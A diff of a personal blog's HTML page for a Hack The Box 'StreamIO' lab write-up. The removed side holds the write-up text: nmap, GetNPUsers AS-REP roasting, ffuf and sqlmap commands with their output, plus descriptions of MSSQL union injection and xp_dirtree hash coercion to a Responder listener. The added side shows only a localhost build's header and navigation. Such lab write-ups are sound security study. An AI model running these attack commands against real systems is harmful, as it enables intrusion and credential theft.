@@ -1,156 +1,385 @@
-<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>HTB: StreamIO | kanyo's blog</title><meta property="og:title" content="HTB: StreamIO | kanyo's blog"><meta name=twitter:title content="HTB: StreamIO | kanyo's blog"><meta itemprop=name content="HTB: StreamIO | kanyo's blog"><meta name=application-name content="HTB: StreamIO | kanyo's blog"><meta property="og:site_name" content><meta name=description content="A Medium Windows box that chains SQL injection on a hidden subdomain through PHP eval RCE to a LAPS read. Firefox saved passwords and JDgodd's group ownership are the two pivots."><meta itemprop=description content="A Medium Windows box that chains SQL injection on a hidden subdomain through PHP eval RCE to a LAPS read. Firefox saved passwords and JDgodd's group ownership are the two pivots."><meta property="og:description" content="A Medium Windows box that chains SQL injection on a hidden subdomain through PHP eval RCE to a LAPS read. Firefox saved passwords and JDgodd's group ownership are the two pivots."><meta name=twitter:description content="A Medium Windows box that chains SQL injection on a hidden subdomain through PHP eval RCE to a LAPS read. Firefox saved passwords and JDgodd's group ownership are the two pivots."><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><link rel=alternate hreflang=en-gb href=https://chaelsoo.me/writeups/htb-streamio/ title=English><meta name=generator content="Hugo 0.161.1"><meta property="og:url" content="https://chaelsoo.me/writeups/htb-streamio/"><meta property="og:site_name" content="kanyo's blog"><meta property="og:title" content="HTB: StreamIO"><meta property="og:description" content="A Medium Windows box that chains SQL injection on a hidden subdomain through PHP eval RCE to a LAPS read. Firefox saved passwords and JDgodd's group ownership are the two pivots."><meta property="og:locale" content="en_gb"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2026-06-03T00:00:00+00:00"><meta property="article:modified_time" content="2026-06-03T00:00:00+00:00"><meta property="article:tag" content="Laps"><meta property="article:tag" content="Ps-Remoting"><meta property="article:tag" content="Sqli"><meta property="article:tag" content="Rfi"><meta property="article:tag" content="Windows"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB: StreamIO"><meta name=twitter:description content="A Medium Windows box that chains SQL injection on a hidden subdomain through PHP eval RCE to a LAPS read. Firefox saved passwords and JDgodd's group ownership are the two pivots."><link rel=canonical href=https://chaelsoo.me/writeups/htb-streamio/><link href=/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://chaelsoo.me/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://chaelsoo.me/ class=logo><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
-</a><input type=checkbox id=menu-trigger class=menu-trigger>
-<label for=menu-trigger><span class=menu-icon><svg width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class=menu-link href=/blogs/>Blogs</a></li><li><a class="menu-link active" href=/writeups/>Writeups</a></li><li><a class=menu-link href=/about/>About</a></li><li><a class=menu-link href=https://notes.chaelsoo.me>Cheatsheet</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg>
-<svg class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>HTB: StreamIO</h1><div class=post-meta><time datetime=2026-06-03T00:00:00+00:00 itemprop=datePublished>3 Jun 2026</time></div></header><img src=/images/writeups/htb-streamio/htb-streamio-pwned.png alt="HTB: StreamIO" style="width:100%;border-radius:.5rem;margin:1.5rem 0"><div class=toc-container><button class=toc-toggle type=button onclick=toggleToc()>Table of Contents</button><div class=toc-content id=tocContent><nav id=TableOfContents><ul><li><a href=#recon>Recon</a></li><li><a href=#sql-injection-on-watchstreamiohtb>SQL Injection on watch.streamIO.htb</a></li><li><a href=#admin-panel-rfi-and-eval-rce>Admin Panel: RFI and eval() RCE</a></li><li><a href=#lateral-movement-to-nikk37>Lateral Movement to nikk37</a></li><li><a href=#firefox-credentials-and-the-laps-chain>Firefox Credentials and the LAPS Chain</a></li></ul></nav></div></div><div class=mini-toc id=miniToc><div class=mini-toc-header><div class=mini-toc-title>Contents</div><button class=mini-toc-minimize type=button onclick=toggleMiniToc() aria-label="Minimize TOC">
-<svg fill="currentColor" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1 8a.5.5.0 01.5-.5h13a.5.5.0 010 1h-13A.5.5.0 011 8zM7.646 4.146a.5.5.0 01.708.0l2 2a.5.5.0 01-.708.708L8.5 5.707V11.5a.5.5.0 01-1 0V5.707L6.354 6.854a.5.5.0 11-.708-.708l2-2z"/></svg></button></div><div class=mini-toc-content id=miniTocContent></div></div><div class=page-content><p>Windows AD box with a PHP streaming site on HTTPS. The attack chain is unusually web-heavy for an HTB Active Directory box: you spend more time in Burp than in evil-winrm before the domain even becomes relevant. The interesting part isn&rsquo;t any single vulnerability. It&rsquo;s how a SQL injection on one subdomain eventually feeds into an eval() backdoor on another, and how Firefox&rsquo;s credential store hands over an AD account with a path nobody mentions until you look at it in BloodHound.</p><h2 id=recon>Recon</h2><p>10.129.11.215, domain <code>streamIO.htb</code>, DC hostname <code>DC</code>. Port 80 had the default IIS page. Port 443 was more interesting: the TLS certificate&rsquo;s Subject Alternative Names listed two hosts, <code>streamIO.htb</code> and <code>watch.streamIO.htb</code>. Standard AD ports alongside: Kerberos, LDAP, SMB, WinRM on 5985.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/htb/streamIO ❯ nmap -sC -sV -T4 <span class=nv>$DC_IP</span>
-</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-06-02 23:24 +0100
-</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.11.215
-</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.10s latency<span class=o>)</span>.
-</span></span><span class=line><span class=cl>Not shown: <span class=m>986</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
-</span></span><span class=line><span class=cl>PORT     STATE SERVICE       VERSION
-</span></span><span class=line><span class=cl>53/tcp   open  domain        Simple DNS Plus
-</span></span><span class=line><span class=cl>80/tcp   open  http          Microsoft IIS httpd 10.0
-</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
-</span></span><span class=line><span class=cl><span class=p>|</span>_  Potentially risky methods: TRACE
-</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-IIS/10.0
-</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: IIS Windows Server
-</span></span><span class=line><span class=cl>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class=o>(</span>server time: 2026-06-03 05:24:29Z<span class=o>)</span>
-</span></span><span class=line><span class=cl>135/tcp  open  msrpc         Microsoft Windows RPC
-</span></span><span class=line><span class=cl>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-</span></span><span class=line><span class=cl>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: streamIO.htb, Site: Default-First-Site-Name<span class=o>)</span>
-</span></span><span class=line><span class=cl>443/tcp  open  ssl/https?
-</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn: 
-</span></span><span class=line><span class=cl><span class=p>|</span>   h2
-</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
-</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>streamIO/countryName<span class=o>=</span>EU
-</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
-</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2022-02-22T07:03:28
-</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2022-03-24T07:03:28
-</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds?
-</span></span><span class=line><span class=cl>464/tcp  open  kpasswd5?
-</span></span><span class=line><span class=cl>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-</span></span><span class=line><span class=cl>636/tcp  open  tcpwrapped
-</span></span><span class=line><span class=cl>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: streamIO.htb, Site: Default-First-Site-Name<span class=o>)</span>
-</span></span><span class=line><span class=cl>3269/tcp open  tcpwrapped
-</span></span><span class=line><span class=cl>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-HTTPAPI/2.0
-</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Not Found
-</span></span><span class=line><span class=cl>Service Info: Host: DC<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
-</span></span></code></pre></div><p>The main site at <code>streamIO.htb</code> was a movie streaming platform. The footer had a staff section with names and job titles: Barry (Content manager), Oliver (Web Developer), Samantha (Public affairs manager).</p><p><img src=/images/writeups/htb-streamio/web-streamio-staff-section.png alt="streamio.htb footer showing staff members Barry, Oliver, and Samantha with their roles"></p><p>I generated username variants and tried AS-REP roasting against all of them. Every account came back <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>. These names don&rsquo;t exist as AD accounts:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/htb/streamIO ✗ GetNPUsers.py streamIO.htb/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 10.129.11.215
-</span></span><span class=line><span class=cl>Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class=o>(</span>Client not found in Kerberos database<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class=o>(</span>Client not found in Kerberos database<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class=o>(</span>Client not found in Kerberos database<span class=o>)</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> User administrator doesn<span class=err>&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class=nb>set</span>
-</span></span></code></pre></div><p>The website names were a dead end. I moved on to the <code>watch.</code> subdomain.</p><h2 id=sql-injection-on-watchstreamiohtb>SQL Injection on watch.streamIO.htb</h2><p>The watch subdomain was a separate streaming interface. Fuzzing it found only a <code>/static</code> redirect:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/htb/streamIO ❯ ffuf -u https://watch.streamIO.htb/FUZZ -w ~/tools/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>static                  <span class=o>[</span>Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 291ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>Static                  <span class=o>[</span>Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 177ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>STATIC                  <span class=o>[</span>Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 160ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>:: Progress: <span class=o>[</span>29999/29999<span class=o>]</span> :: Job <span class=o>[</span>1/1<span class=o>]</span> :: <span class=m>262</span> req/sec :: Duration: <span class=o>[</span>0:02:57<span class=o>]</span> :: Errors: <span class=m>1</span> ::
-</span></span></code></pre></div><p>There was an email form on the main watch page. SQLMap against that <code>email</code> parameter came back clean:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/htb/streamIO ❯ sqlmap -r req 
-</span></span><span class=line><span class=cl><span class=o>[</span>03:21:48<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> parsing HTTP request from <span class=s1>&#39;req&#39;</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>03:21:48<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing connection to the target URL
-</span></span><span class=line><span class=cl><span class=o>[</span>03:21:49<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> the web server responded with an HTTP error code <span class=o>(</span>405<span class=o>)</span> which could interfere with the results of the tests
-</span></span><span class=line><span class=cl><span class=o>[</span>03:21:49<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> checking <span class=k>if</span> the target is protected by some kind of WAF/IPS
-</span></span><span class=line><span class=cl><span class=o>[</span>03:21:49<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=k>if</span> the target URL content is stable
-</span></span><span class=line><span class=cl><span class=o>[</span>03:21:49<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> target URL content is stable
-</span></span><span class=line><span class=cl><span class=o>[</span>03:21:49<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=k>if</span> POST parameter <span class=s1>&#39;email&#39;</span> is dynamic
-</span></span><span class=line><span class=cl><span class=o>[</span>03:21:49<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> POST parameter <span class=s1>&#39;email&#39;</span> does not appear to be dynamic
-</span></span><span class=line><span class=cl><span class=o>[</span>03:21:50<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> heuristic <span class=o>(</span>basic<span class=o>)</span> <span class=nb>test</span> shows that POST parameter <span class=s1>&#39;email&#39;</span> might not be injectable
-</span></span><span class=line><span class=cl>...
-</span></span><span class=line><span class=cl><span class=o>[</span>03:22:04<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> POST parameter <span class=s1>&#39;email&#39;</span> does not seem to be injectable
-</span></span><span class=line><span class=cl><span class=o>[</span>03:22:04<span class=o>]</span> <span class=o>[</span>CRITICAL<span class=o>]</span> all tested parameters <span class=k>do</span> not appear to be injectable.
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> ending @ 03:22:04 /2026-06-03/
-</span></span></code></pre></div><p>Fuzzing found a <code>/search.php</code> endpoint. SQLMap triggered the site&rsquo;s blocking mechanism almost immediately. Each automated request redirected to <code>blocked.php</code> with an access denied page:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/htb/streamIO ✗ sqlmap -r search_req 
-</span></span><span class=line><span class=cl><span class=o>[</span>03:36:01<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> parsing HTTP request from <span class=s1>&#39;search_req&#39;</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>03:36:01<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing connection to the target URL
-</span></span><span class=line><span class=cl><span class=o>[</span>03:36:02<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=k>if</span> the target URL content is stable
-</span></span><span class=line><span class=cl><span class=o>[</span>03:36:02<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=k>if</span> POST parameter <span class=s1>&#39;q&#39;</span> is dynamic
-</span></span><span class=line><span class=cl><span class=o>[</span>03:36:03<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> POST parameter <span class=s1>&#39;q&#39;</span> does not appear to be dynamic
-</span></span><span class=line><span class=cl><span class=o>[</span>03:36:04<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> heuristic <span class=o>(</span>basic<span class=o>)</span> <span class=nb>test</span> shows that POST parameter <span class=s1>&#39;q&#39;</span> might not be injectable
-</span></span><span class=line><span class=cl><span class=o>[</span>03:36:04<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=k>for</span> SQL injection on POST parameter <span class=s1>&#39;q&#39;</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>03:36:04<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing <span class=s1>&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>got a <span class=m>302</span> redirect to <span class=s1>&#39;https://watch.streamio.htb/blocked.php&#39;</span>. Do you want to follow? <span class=o>[</span>Y/n<span class=o>]</span> n
-</span></span></code></pre></div><p>Manual injection worked fine though. Injecting a single quote into the <code>q</code> parameter produced a Microsoft SQL Server error, confirming the database and the injectable parameter.</p><p><img src=/images/writeups/htb-streamio/web-search-sqli-mssql-error.png alt="Burp Suite showing POST to search.php with SQLi payload and MSSQL error response in the orange-highlighted box"></p><p>In a union-based injection, you append a <code>UNION SELECT</code> to the original query so the database returns rows from a table you choose. The number of columns in your injected SELECT has to match the original query&rsquo;s column count, six columns here, determined by incrementing until the injection stopped erroring.</p><p>I also tried coercing the SQL service&rsquo;s NTLMv2 hash via <code>xp_dirtree</code> pointing at a Responder listener. That worked, but the hash belonged to the <code>DC$</code> machine account, not a user account:</p><pre tabindex=0><code>[SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.158
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HTB: StreamIO | kanyo&#39;s blog</title>
+<meta property="og:title" content="HTB: StreamIO | kanyo&#39;s blog" />
+<meta name="twitter:title" content="HTB: StreamIO | kanyo&#39;s blog" />
+<meta itemprop="name" content="HTB: StreamIO | kanyo&#39;s blog" />
+<meta name="application-name" content="HTB: StreamIO | kanyo&#39;s blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="A Medium Windows box that chains SQL injection on a hidden subdomain through PHP eval RCE to a LAPS read. Firefox saved passwords and JDgodd&#39;s group ownership are the two pivots.">
+<meta itemprop="description" content="A Medium Windows box that chains SQL injection on a hidden subdomain through PHP eval RCE to a LAPS read. Firefox saved passwords and JDgodd&#39;s group ownership are the two pivots." />
+<meta property="og:description" content="A Medium Windows box that chains SQL injection on a hidden subdomain through PHP eval RCE to a LAPS read. Firefox saved passwords and JDgodd&#39;s group ownership are the two pivots." />
+<meta name="twitter:description" content="A Medium Windows box that chains SQL injection on a hidden subdomain through PHP eval RCE to a LAPS read. Firefox saved passwords and JDgodd&#39;s group ownership are the two pivots." />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/writeups/htb-streamio/" title="English" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.161.1">
+
+    
+    <meta property="og:url" content="http://localhost:1313/writeups/htb-streamio/">
+  <meta property="og:site_name" content="kanyo&#39;s blog">
+  <meta property="og:title" content="HTB: StreamIO">
+  <meta property="og:description" content="A Medium Windows box that chains SQL injection on a hidden subdomain through PHP eval RCE to a LAPS read. Firefox saved passwords and JDgodd&#39;s group ownership are the two pivots.">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-06-03T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-06-03T00:00:00+00:00">
+    <meta property="article:tag" content="Laps">
+    <meta property="article:tag" content="Ps-Remoting">
+    <meta property="article:tag" content="Sqli">
+    <meta property="article:tag" content="Rfi">
+    <meta property="article:tag" content="Windows">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: StreamIO">
+  <meta name="twitter:description" content="A Medium Windows box that chains SQL injection on a hidden subdomain through PHP eval RCE to a LAPS read. Firefox saved passwords and JDgodd&#39;s group ownership are the two pivots.">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/writeups/htb-streamio/">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/blogs/">
+                        Blogs
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/writeups/">
+                        Writeups
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="https://notes.chaelsoo.me">
+                        Cheatsheet
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HTB: StreamIO</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-06-03T00:00:00&#43;00:00" itemprop="datePublished"> 3 Jun 2026 </time>
+                </div>
+                
+            </header>
+            
